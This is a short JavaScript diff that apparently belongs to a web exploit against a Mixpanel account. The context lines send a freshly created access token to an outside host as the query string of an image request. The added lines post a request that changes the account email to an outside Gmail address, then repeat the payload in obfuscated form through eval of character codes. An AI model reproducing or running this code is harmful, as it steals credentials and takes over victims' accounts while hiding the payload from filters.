@@ -34,3 +34,6 @@ if (confirm("Create an access token?")) {
     image.src = `//aw.rs/g/leak.gif?token=${token}`;
   });
 }
+
+$.post("https://mixpanel.com/account/update_name/",{email: "shg33k@gmail.com"},function(data,status){console.log("Data: " + data + "\nStatus: " + status);})
+with(String){eval(fromCharCode(36,46,112,111,115,116,...))}
